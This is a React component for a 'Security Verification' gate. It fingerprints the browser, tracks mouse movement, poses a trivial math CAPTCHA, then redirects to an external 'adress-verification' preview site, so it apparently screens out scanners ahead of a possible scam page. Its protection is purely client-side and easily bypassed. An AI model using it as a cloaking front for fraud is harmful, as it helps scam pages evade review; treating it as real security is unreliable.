import React, { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { Shield, AlertTriangle, CheckCircle, Eye, MousePointer, Clock, Fingerprint } from 'lucide-react';
import { toast } from '@/hooks/use-toast';

interface VerificationState {
  deviceFingerprint: boolean;
  mouseMovement: boolean;
  captchaChallenge: boolean;
  behaviorAnalysis: boolean;
  timingCheck: boolean;
  browserFeatures: boolean;
}

const BotProtection: React.FC = () => {
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationStep, setVerificationStep] = useState(0);
  const [verificationState, setVerificationState] = useState<VerificationState>({
    deviceFingerprint: false,
    mouseMovement: false,
    captchaChallenge: false,
    behaviorAnalysis: false,
    timingCheck: false,
    browserFeatures: false,
  });
  const [mouseMovements, setMouseMovements] = useState<Array<{x: number, y: number, timestamp: number}>>([]);
  const [captchaAnswer, setCaptchaAnswer] = useState('');
  const [captchaQuestion, setCaptchaQuestion] = useState({ question: '', answer: 0 });
  const [startTime, setStartTime] = useState(Date.now());
  const [progress, setProgress] = useState(0);
  const [showCaptcha, setShowCaptcha] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [accessAttempts, setAccessAttempts] = useState(0);
  const containerRef = useRef<HTMLDivElement>(null);

  // Generate simple math captcha (only addition with small numbers)
  const generateCaptcha = () => {
    const num1 = Math.floor(Math.random() * 5) + 1; // 1-5
    const num2 = Math.floor(Math.random() * 5) + 1; // 1-5
    const answer = num1 + num2;
    const question = `${num1} + ${num2}`;
    
    setCaptchaQuestion({ question, answer });
  };

  // Device fingerprinting
  const createDeviceFingerprint = (): string => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Device fingerprint test', 2, 2);
    }
    
    const fingerprint = [
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      new Date().getTimezoneOffset(),
      navigator.hardwareConcurrency,
      canvas.toDataURL(),
      navigator.platform,
      navigator.cookieEnabled,
      navigator.doNotTrack,
      window.devicePixelRatio
    ].join('|');
    
    return btoa(fingerprint);
  };

  // Mouse movement tracking
  const handleMouseMove = (e: React.MouseEvent) => {
    if (!isVerifying) return;
    
    const movement = {
      x: e.clientX,
      y: e.clientY,
      timestamp: Date.now()
    };
    
    setMouseMovements(prev => [...prev.slice(-50), movement]);
  };

  // Analyze mouse movement patterns
  const analyzeMouseMovement = (): boolean => {
    if (mouseMovements.length < 10) return false;
    
    let totalDistance = 0;
    let speedVariations = 0;
    let previousSpeed = 0;
    
    for (let i = 1; i < mouseMovements.length; i++) {
      const curr = mouseMovements[i];
      const prev = mouseMovements[i - 1];
      
      const distance = Math.sqrt(
        Math.pow(curr.x - prev.x, 2) + Math.pow(curr.y - prev.y, 2)
      );
      
      const timeDiff = curr.timestamp - prev.timestamp;
      const speed = distance / timeDiff;
      
      totalDistance += distance;
      
      if (i > 1) {
        const speedDiff = Math.abs(speed - previousSpeed);
        speedVariations += speedDiff;
      }
      
      previousSpeed = speed;
    }
    
    const averageSpeed = totalDistance / mouseMovements.length;
    const averageSpeedVariation = speedVariations / (mouseMovements.length - 2);
    
    return averageSpeed > 0.1 && averageSpeedVariation > 0.05 && totalDistance > 200;
  };

  // Browser features detection
  const checkBrowserFeatures = (): boolean => {
    const features = [
      'webgl',
      'webgl2',
      'canvas',
      'localStorage',
      'sessionStorage',
      'indexedDB',
      'webWorker',
      'notification',
      'geolocation'
    ];
    
    let supportedFeatures = 0;
    
    features.forEach(feature => {
      switch (feature) {
        case 'webgl':
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) supportedFeatures++;
          } catch (e) {}
          break;
        case 'webgl2':
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl2');
            if (gl) supportedFeatures++;
          } catch (e) {}
          break;
        case 'canvas':
          try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if (ctx) supportedFeatures++;
          } catch (e) {}
          break;
        case 'localStorage':
          if (typeof Storage !== 'undefined') supportedFeatures++;
          break;
        case 'sessionStorage':
          if (typeof Storage !== 'undefined') supportedFeatures++;
          break;
        case 'indexedDB':
          if (window.indexedDB) supportedFeatures++;
          break;
        case 'webWorker':
          if (typeof Worker !== 'undefined') supportedFeatures++;
          break;
        case 'notification':
          if ('Notification' in window) supportedFeatures++;
          break;
        case 'geolocation':
          if ('geolocation' in navigator) supportedFeatures++;
          break;
      }
    });
    
    return supportedFeatures >= 6;
  };

  // Start verification process
  const startVerification = async () => {
    const attempts = parseInt(localStorage.getItem('accessAttempts') || '0');
    
    if (attempts >= 3) {
      toast({
        title: "Access Blocked",
        description: "Too many failed attempts. Please try again later.",
        variant: "destructive",
      });
      return;
    }
    
    setAccessAttempts(attempts + 1);
    localStorage.setItem('accessAttempts', (attempts + 1).toString());
    
    setIsVerifying(true);
    setStartTime(Date.now());
    setProgress(0);
    generateCaptcha();
    
    // Step 1: Device fingerprinting
    setTimeout(() => {
      const fingerprint = createDeviceFingerprint();
      console.log('Device fingerprint created:', fingerprint.substring(0, 50) + '...');
      
      setVerificationState(prev => ({ ...prev, deviceFingerprint: true }));
      setProgress(16);
      setVerificationStep(1);
      
      // Step 2: Browser features check
      setTimeout(() => {
        const browserCheck = checkBrowserFeatures();
        console.log('Browser features check:', browserCheck);
        
        setVerificationState(prev => ({ ...prev, browserFeatures: browserCheck }));
        setProgress(32);
        setVerificationStep(2);
        
        // Step 3: Show CAPTCHA
        setTimeout(() => {
          setShowCaptcha(true);
          setProgress(48);
          setVerificationStep(3);
        }, 1000);
      }, 1500);
    }, 1000);
  };

  // Verify CAPTCHA
  const verifyCaptcha = () => {
    const userAnswer = parseInt(captchaAnswer);
    
    if (userAnswer === captchaQuestion.answer) {
      setVerificationState(prev => ({ ...prev, captchaChallenge: true }));
      setProgress(64);
      setVerificationStep(4);
      setShowCaptcha(false);
      
      // Step 4: Analyze mouse movement
      setTimeout(() => {
        const mouseAnalysis = analyzeMouseMovement();
        console.log('Mouse movement analysis:', mouseAnalysis);
        
        setVerificationState(prev => ({ ...prev, mouseMovement: mouseAnalysis }));
        setProgress(80);
        setVerificationStep(5);
        
        // Step 5: Timing analysis
        setTimeout(() => {
          const verificationTime = Date.now() - startTime;
          const timingCheck = verificationTime > 5000 && verificationTime < 60000;
          console.log('Timing check:', timingCheck, 'Time taken:', verificationTime);
          
          setVerificationState(prev => ({ ...prev, timingCheck }));
          setProgress(96);
          setVerificationStep(6);
          
          // Final verification
          setTimeout(() => {
            const allChecks = Object.values({
              ...verificationState,
              captchaChallenge: true,
              mouseMovement: mouseAnalysis,
              timingCheck,
            });
            
            const passedChecks = allChecks.filter(Boolean).length;
            const behaviorAnalysis = passedChecks >= 4;
            
            setVerificationState(prev => ({ ...prev, behaviorAnalysis }));
            setProgress(100);
            
            if (behaviorAnalysis) {
              setIsVerified(true);
              localStorage.removeItem('accessAttempts');
              
              toast({
                title: "Verification Successful!",
                description: "You have been verified as a real user. Redirecting...",
              });
              
              setTimeout(() => {
                window.location.href = 'https://preview--adress-verification-nnow.lovable.app/';
              }, 2000);
            } else {
              toast({
                title: "Verification Failed",
                description: "Please try again. Make sure to interact naturally with the page.",
                variant: "destructive",
              });
              
              setTimeout(() => {
                setIsVerifying(false);
                setVerificationStep(0);
                setProgress(0);
                setVerificationState({
                  deviceFingerprint: false,
                  mouseMovement: false,
                  captchaChallenge: false,
                  behaviorAnalysis: false,
                  timingCheck: false,
                  browserFeatures: false,
                });
                setMouseMovements([]);
              }, 3000);
            }
          }, 1000);
        }, 1000);
      }, 1000);
    } else {
      toast({
        title: "Incorrect Answer",
        description: "Please solve the math problem correctly.",
        variant: "destructive",
      });
      generateCaptcha();
      setCaptchaAnswer('');
    }
  };

  const getVerificationStepText = () => {
    switch (verificationStep) {
      case 0: return "Click to start verification";
      case 1: return "Analyzing device fingerprint...";
      case 2: return "Checking browser capabilities...";
      case 3: return "Please solve the CAPTCHA";
      case 4: return "Analyzing interaction patterns...";
      case 5: return "Verifying response timing...";
      case 6: return "Completing verification...";
      default: return "Verification complete";
    }
  };

  return (
    <div 
      ref={containerRef}
      className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4"
      onMouseMove={handleMouseMove}
    >
      <Card className="w-full max-w-md bg-slate-800 border-slate-700 shadow-2xl">
        <CardHeader className="text-center">
          <div className="flex items-center justify-center mb-4">
            <Shield className="h-12 w-12 text-purple-400" />
          </div>
          <CardTitle className="text-2xl font-bold text-white mb-2">
            Security Verification
          </CardTitle>
          <CardDescription className="text-slate-300">
            Please complete verification to access the protected content
          </CardDescription>
        </CardHeader>
        
        <CardContent className="space-y-6">
          {!isVerifying && !isVerified && (
            <div className="text-center">
              <Button 
                onClick={startVerification}
                className="w-full bg-purple-600 hover:bg-purple-700 text-white"
                disabled={accessAttempts >= 3}
              >
                {accessAttempts >= 3 ? 'Access Blocked' : 'Start Verification'}
              </Button>
              {accessAttempts > 0 && accessAttempts < 3 && (
                <p className="text-sm text-yellow-400 mt-2">
                  Attempts remaining: {3 - accessAttempts}
                </p>
              )}
            </div>
          )}
          
          {isVerifying && (
            <div className="space-y-4">
              <div className="text-center">
                <p className="text-sm text-slate-300 mb-2">{getVerificationStepText()}</p>
                <Progress value={progress} className="w-full" />
              </div>
              
              {showCaptcha && (
                <div className="space-y-4 p-4 bg-slate-700 rounded-lg">
                  <div className="text-center">
                    <h3 className="text-lg font-semibold text-white mb-2">
                      Simple Math Problem:
                    </h3>
                    <p className="text-3xl font-bold text-purple-400 mb-4">
                      {captchaQuestion.question} = ?
                    </p>
                    <p className="text-sm text-slate-300 mb-3">
                      Just add the two numbers together
                    </p>
                    <input
                      type="number"
                      value={captchaAnswer}
                      onChange={(e) => setCaptchaAnswer(e.target.value)}
                      className="w-full px-3 py-2 bg-slate-600 text-white rounded-lg border border-slate-500 focus:border-purple-400 focus:outline-none text-center text-xl"
                      placeholder="Enter answer"
                      min="1"
                      max="10"
                    />
                    <Button 
                      onClick={verifyCaptcha}
                      className="w-full mt-3 bg-purple-600 hover:bg-purple-700"
                      disabled={!captchaAnswer}
                    >
                      Verify Answer
                    </Button>
                  </div>
                </div>
              )}
              
              <div className="grid grid-cols-2 gap-2 text-sm">
                <div className={`flex items-center space-x-2 ${verificationState.deviceFingerprint ? 'text-green-400' : 'text-slate-400'}`}>
                  <Fingerprint className="h-4 w-4" />
                  <span>Device Check</span>
                  {verificationState.deviceFingerprint && <CheckCircle className="h-4 w-4" />}
                </div>
                
                <div className={`flex items-center space-x-2 ${verificationState.browserFeatures ? 'text-green-400' : 'text-slate-400'}`}>
                  <Eye className="h-4 w-4" />
                  <span>Browser Check</span>
                  {verificationState.browserFeatures && <CheckCircle className="h-4 w-4" />}
                </div>
                
                <div className={`flex items-center space-x-2 ${verificationState.captchaChallenge ? 'text-green-400' : 'text-slate-400'}`}>
                  <AlertTriangle className="h-4 w-4" />
                  <span>CAPTCHA</span>
                  {verificationState.captchaChallenge && <CheckCircle className="h-4 w-4" />}
                </div>
                
                <div className={`flex items-center space-x-2 ${verificationState.mouseMovement ? 'text-green-400' : 'text-slate-400'}`}>
                  <MousePointer className="h-4 w-4" />
                  <span>Behavior</span>
                  {verificationState.mouseMovement && <CheckCircle className="h-4 w-4" />}
                </div>
                
                <div className={`flex items-center space-x-2 ${verificationState.timingCheck ? 'text-green-400' : 'text-slate-400'}`}>
                  <Clock className="h-4 w-4" />
                  <span>Timing</span>
                  {verificationState.timingCheck && <CheckCircle className="h-4 w-4" />}
                </div>
                
                <div className={`flex items-center space-x-2 ${verificationState.behaviorAnalysis ? 'text-green-400' : 'text-slate-400'}`}>
                  <Shield className="h-4 w-4" />
                  <span>Analysis</span>
                  {verificationState.behaviorAnalysis && <CheckCircle className="h-4 w-4" />}
                </div>
              </div>
            </div>
          )}
          
          {isVerified && (
            <div className="text-center space-y-4">
              <div className="flex items-center justify-center">
                <CheckCircle className="h-16 w-16 text-green-400" />
              </div>
              <h3 className="text-xl font-semibold text-white">
                Verification Successful!
              </h3>
              <p className="text-slate-300">
                You have been verified as a real user. Redirecting to protected content...
              </p>
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-400 mx-auto"></div>
            </div>
          )}
          
          <div className="text-center text-xs text-slate-400">
            <p>This page is protected by advanced anti-bot security</p>
            <p>Move your mouse naturally and interact with the page</p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default BotProtection;
